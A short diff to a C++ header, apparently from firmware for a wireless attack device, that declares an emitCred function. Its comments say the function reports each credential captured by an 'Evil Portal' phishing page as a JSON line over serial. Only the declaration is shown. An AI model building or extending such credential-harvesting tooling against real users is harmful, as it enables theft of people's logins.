@@ -65,6 +65,12 @@ namespace JsonSerial {
   //   counts (v[]), plus the 1-based page index. Emitting actual channel
   //   numbers means the host needs no out-of-band channel mapping.
   void emitChannelActivity(const int* channels, const uint8_t* values, int count, int page);
+
+  // emitCred: one captured Evil Portal submission, as
+  //   @J {"t":"cred","u":"<user>","p":"<pass>"}. Gated by jsonModeEnabled() so a
+  //   plain serial monitor still sees only the human-readable "u: .. p: .." line.
+  //   Both fields are JSON/UTF-8 escaped, so arbitrary form input stays valid JSON.
+  void emitCred(const String& user, const String& pass);
 }
 
 #endif
